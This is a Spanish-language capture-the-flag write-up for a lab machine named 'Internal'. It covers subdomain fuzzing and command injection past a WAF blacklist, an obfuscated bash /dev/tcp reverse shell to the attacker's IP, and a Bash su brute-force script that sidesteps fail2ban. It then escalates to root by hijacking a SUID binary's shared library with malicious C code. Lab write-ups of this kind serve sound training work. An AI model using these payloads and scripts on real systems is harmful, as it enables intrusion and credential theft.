
# Writeup — Internal

**Hecho por:** buda-sys  
**Fecha:** 25/02/2026  
**Dificultad:** Media

---

**Acceso**

|Usuario|Contraseña|
|---|---|
|vault|Yk8$pZ5@cN4!|

**Servicios activos**

apache2, ssh, fail2ban

---

## Descripción

**Internal** es una máquina basada en una aplicación web de backups. Al enumerar, encontramos un subdominio con una terminal web que permite listar archivos. A través de ese input logramos inyección de comandos (RCE) evadiendo los filtros del WAF para obtener una reverse shell.

Una vez dentro, realizamos fuerza bruta interna. Como fail2ban bloquea la IP si se realizan 3 intentos fallidos en 60 segundos, no podemos usar Hydra directamente. Utilizando la bóveda de contraseñas oculta que encontramos en el sistema, creamos un script en Bash para hacer fuerza bruta al usuario `vault` respetando el límite de intentos.

Finalmente, para escalar privilegios enumeramos los binarios SUID y encontramos uno vulnerable al que le aplicamos **Shared Library Hijacking** para obtener una shell como root.

---

## Cadena de ataque

```
Enumeración de puertos
        ↓
Fuzzing de subdominios
        ↓
Inyección de comandos (bypass de filtros) → Reverse Shell
        ↓
Fuerza bruta interna (script Bash — bypass fail2ban)
        ↓
SUID Binary + Shared Library Hijacking → shell root
```

---

## Enumeración

Empezamos enumerando los puertos abiertos de la máquina objetivo.

```bash
sudo nmap -p- --open -Pn -n -sSVC --min-rate 5000 172.17.0.2

Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 20:18 -0500
Nmap scan report for 172.17.0.2
Host is up (0.0000010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f9:66:aa:77:67:23:c3:15:5a:fb:3d:02:08:71:c7:9f (ECDSA)
|_  256 82:a2:e0:d9:84:da:39:bf:da:06:51:b8:3b:32:9a:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://internal.dl/
```

Observamos que los puertos **22 (SSH)** y **80 (HTTP)** están abiertos. El puerto 80 nos redirige automáticamente al dominio `internal.dl`, lo que nos revela el dominio sin necesidad de fuerza bruta. Lo agregamos al `/etc/hosts`.

```bash
echo "172.17.0.2  internal.dl" | sudo tee -a /etc/hosts
```

Al visitar la página web vemos que se trata de un panel de control de copias de seguridad con cifrado.

![[vault.png]]

Al enumerar directorios no encontramos nada relevante, pero sí un subdominio con `ffuf`.

```bash
ffuf -ic -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://internal.dl \
     -H "Host: FUZZ.internal.dl"

backup    [Status: 200, Size: 22554, Words: 4271, Lines: 812, Duration: 3ms]
```

Encontramos el subdominio `backup.internal.dl`. Lo agregamos al `/etc/hosts` sin eliminar el dominio principal.

```bash
sudo sed -i 's/internal.dl/internal.dl backup.internal.dl/' /etc/hosts
```

Al visitar el subdominio encontramos un administrador de copias de seguridad con una terminal web para ejecutar comandos.

![[vault2.png]]

---

## Intrusión

Al ingresar una ruta en la terminal web, vemos que el sistema la procesa con `ls -lah`. Esto indica que el input del usuario se pasa directamente a un comando del sistema, lo que sugiere una posible **inyección de comandos**.

![[vault3.png]]

Al intentar inyecciones básicas, la aplicación las bloquea. Probamos los operadores `;`, `||`, `&&` y `\n` y todos son rechazados por el WAF.

![[vault5.png]]

Sin embargo, los operadores `|`, `&` y `$()` no están bloqueados. Además, la aplicación acepta espacios literales, ya que el WAF solo filtra sus representaciones URL-encodeadas (`%20`, `%09`, `+`).

![[vault6.png]]

Al intentar ejecutar comandos como `whoami` o `id`, el WAF los bloquea por lista negra. Sin embargo, podemos bypassear estos filtros partiendo las palabras:

```bash
who$@ami
w'h'o'am'i
w\h\o\am\i
```

Con esto confirmamos que tenemos **RCE** sobre el sistema y encontramos el usuario `vault`.

![[vault7.png]]

### Reverse Shell

**En nuestra máquina levantamos el listener con pwncat:**

```bash
pwncat-cs -lp 4444
```

**En la aplicación web inyectamos la reverse shell en dos pasos:**

Primero creamos el script en `/tmp`:

```bash
/var/backups|printf${IFS}'ba''sh\t-i\t>&/dev/tcp/172.17.0.1/4444\t0>&1'>/tmp/x
```

Luego lo ejecutamos:

```bash
/var/backups|ba''sh${IFS}/tmp/x
```

![[vault8.png]]

Este payload está **ofuscado** para bypassear los filtros:

- `${IFS}` reemplaza el espacio usando la variable interna del sistema (Internal Field Separator).
- `ba''sh` parte la palabra `bash` en fragmentos para evadir la lista negra de comandos.
- `\t` es un tab, que reemplaza los espacios dentro del comando de la reverse shell.
- `/dev/tcp/172.17.0.1/4444` abre una conexión TCP hacia nuestra máquina en el puerto 4444.
- `>&` redirige stdout y stderr al socket.
- `0>&1` redirige stdin, dando una shell interactiva completa.

![[vault9.png]]

Obtenemos acceso al sistema como `www-data`.

---

## Enumeración del sistema

Una vez dentro, enumeramos el sistema con pwncat para identificar usuarios, procesos y archivos relevantes.

```bash
(local) pwncat$ run enumerate.gather
```

Identificamos que el servicio **fail2ban** está activo, lo que significa que hay protección contra intentos de inicio de sesión. Si realizamos más de 3 intentos fallidos en 60 segundos, nuestra IP será bloqueada y no podremos usar herramientas como Hydra directamente.

También encontramos los usuarios `vault` y `ubuntu` en el sistema.

![[vault12.png]]

Al buscar archivos ocultos en el sistema encontramos una bóveda de contraseñas:

```bash
find / -type f -name ".*" 2>/dev/null
```

![[vault13.png]]

Se trata de un diccionario de contraseñas almacenado en `/opt/.vault_pass.txt`:

```
X#9mK$vL2@pQ
nR7!wZ3&eT5*
Hy6@jP2#mX8$
qB4!nW9&kL3@
Vz8#cR5$xJ2!
mT3@bY7!pN6&
Kw5$hM2#fQ9@
eL8!vX4&nB6*
Rj2@cT7#wP5$
uN9&mK3!xZ4@
Fb6#yH8$qW2!
sG4@tL5&rJ9*
Dp7!kM3#bX6@
aC2$vN8!wQ5&
Xt9@eR4#hL7$
oW3&jB6!mT2#
Yk8$pZ5@cN4!
iH2#xQ9&fR7*
Mn5!bL3$vW8@
Gq4@tX7#eK2&
```

---

## Movimiento lateral — vault

En la explicación del script agrega algo así:

> "Antes de crear el script, revisamos la configuración de fail2ban para entender sus límites:"

```bash
cat /etc/fail2ban/jail.local

[sshd]
enabled = true
port = ssh
maxretry = 3
findtime = 60
bantime = 30
ignoreip = 127.0.0.1/8 ::1
```
Vemos que fail2ban está configurado para bloquear IPs externas que fallen más de 3 veces en 60 segundos, con un bantime de 30 segundos. Sin embargo, la directiva `ignoreip = 127.0.0.1/8 ::1` indica que **las conexiones desde localhost están completamente ignoradas**, lo que significa que la fuerza bruta desde dentro del sistema no será detectada ni bloqueada. Por eso atacamos desde `127.0.0.1` en lugar de hacerlo externamente."

```bash
cat > /tmp/force.sh << 'EOF'
#!/bin/bash

host="127.0.0.1"
user="vault"
dictionary="/opt/.vault_pass.txt"
delay=5

trap "echo '[!] Abortado por el usuario'; exit 1" SIGINT SIGTERM

echo "[*] Iniciando fuerza bruta sigilosa contra $host"
echo "[*] Usuario: $user"
echo "[*] Delay: ${delay}s entre intentos"
echo ""

while IFS= read -r password; do
    result=$(su -c "whoami" "$user" <<< "$password" 2>/dev/null)

    if [ "$result" = "$user" ]; then
        echo "[+] CONTRASEÑA ENCONTRADA: $password"
        exit 0
    else
        echo "[-] Fallido: $password"
    fi

    sleep $delay

done < "$dictionary"

echo "[-] Wordlist agotada sin resultados"
EOF
chmod +x /tmp/force.sh
bash /tmp/force.sh
```

 obtenemos la contraseña:

```
[+] CONTRASEÑA ENCONTRADA: Yk8$pZ5@cN4!
```

Obtenemos acceso como `vault` y encontramos la primera flag.


![[vault14.png]]

---

## Escalada de privilegios

### Enumeración de binarios SUID

Enumeramos los binarios con el bit SUID activo en el sistema:

```bash
find / -perm -u=s 2>/dev/null

/usr/local/bin/vaultctl   ← llamativo, no es un binario estándar del sistema
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

El binario `/usr/local/bin/vaultctl` nos llama la atención porque no es un binario estándar del sistema. Revisamos sus permisos:

```bash
ls -la /usr/local/bin/vaultctl
-rwsr-xr-x 1 root vault 16136 Feb 25 15:00 /usr/local/bin/vaultctl
```

Los permisos indican lo siguiente:

- `rws` — el dueño (`root`) puede leer, escribir y ejecutar. La `s` indica que el **bit SUID está activo**.
- `r-x` — el grupo (`vault`) puede leer y ejecutar, pero **no modificar**.
- `r-x` — el resto de usuarios también puede leer y ejecutar.

Esto significa que cualquier usuario que ejecute este binario lo hará con privilegios de `root`.

### Análisis con strings

Usamos `strings` para extraer las cadenas de texto legibles del binario y entender qué hace internamente:

```bash
strings /usr/local/bin/vaultctl
```

Los datos más relevantes que encontramos:

```
/opt/vaultlibs/libbackup.so   ← ruta de la librería que carga
run_backup                    ← función que ejecuta
dlopen                        ← carga la librería dinámicamente
dlsym                         ← busca la función run_backup
vaultctl.c                    ← nombre del archivo fuente original
GCC: (Ubuntu 13.3.0)          ← compilador utilizado
```

El binario carga dinámicamente la librería `/opt/vaultlibs/libbackup.so` usando `dlopen()` y ejecuta la función `run_backup()` con `dlsym()`. Si podemos **reemplazar esa librería con una maliciosa**, el binario SUID la ejecutará como root.

### Shared Library Hijacking

Vamos a escalar privilegios utilizando la técnica **Shared Library Hijacking**. Al analizar el binario con `strings` identificamos que carga dinámicamente una librería `.so` usando `dlopen()`. Esto significa que el binario busca y ejecuta código desde un archivo externo en tiempo de ejecución. Si podemos reemplazar esa librería con una maliciosa, el binario SUID la ejecutará con privilegios de `root`."

Verificamos si el usuario `vault` tiene permisos de escritura en ese directorio:

```bash
ls -la /opt/vaultlibs/
drwxrwxr-x 2 root  vault  4096 Feb 25 15:06 .
-rwxrwxr-x 1 vault vault 15656 Feb 25 15:06 libbackup.so
```

El directorio tiene permisos `rwxrwxr-x`, lo que significa que el grupo `vault` puede escribir en él. Podemos reemplazar la librería legítima con una maliciosa.

Creamos la librería maliciosa:

```bash
cat > /tmp/malicioso.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>

void run_backup() {
    setuid(0);           // Elevar privilegios a root
    setgid(0);
    system("/bin/bash -p");  // Lanzar shell como root
}
EOF
```

Compilamos la librería maliciosa y la colocamos en la ruta que carga el binario SUID:

```bash
gcc -shared -fPIC -o /opt/vaultlibs/libbackup.so /tmp/malicioso.c
```

Ejecutamos el binario:

```bash
/usr/local/bin/vaultctl
```

![[vault15.png]]

El binario SUID carga nuestra librería maliciosa, `setuid(0)` eleva los privilegios y obtenemos una **shell como root**.

---

## Análisis del WAF

Al revisar el código fuente de la aplicación web encontramos dos capas de protección:

**WAF** — filtraba operadores comunes de inyección: `;`, `&&`, `||`, `` ` `` y saltos de línea `\n`.

**Lista negra** — filtraba espacios URL-encodeados (`+`, `%20`, `%09`) y comandos peligrosos como `whoami`, `bash`, `cat`, `curl`, entre otros.

Sin embargo, encontramos tres fallas críticas:

**Falla 1 — Espacios literales no filtrados:** el WAF solo bloqueaba representaciones URL-encodeadas del espacio, pero no el espacio literal . Esto nos permitía usarlo directamente en los payloads.

**Falla 2 — Sink vulnerable:**

```php
$cmd = "ls -lah " . $dir . " 2>&1";
$output = shell_exec($cmd . ' & echo ok');
```

El input del usuario se concatena directamente al comando sin sanitización real. El operador `|` no estaba bloqueado, lo que nos permitía encadenar comandos.

**Falla 3 — Bypass de lista negra con word boundary:** los comandos bloqueados usaban `\b` (límite de palabra en regex), lo que significa que podíamos evadir el filtro partiendo las palabras con caracteres especiales:

```bash
# Bloqueado
bash

# Bypass
ba''sh
ba$@sh
```

En resumen, los desarrolladores filtraron muchos vectores pero dejaron pasar el espacio literal y el operador `|`, lo cual fue suficiente para lograr RCE completo.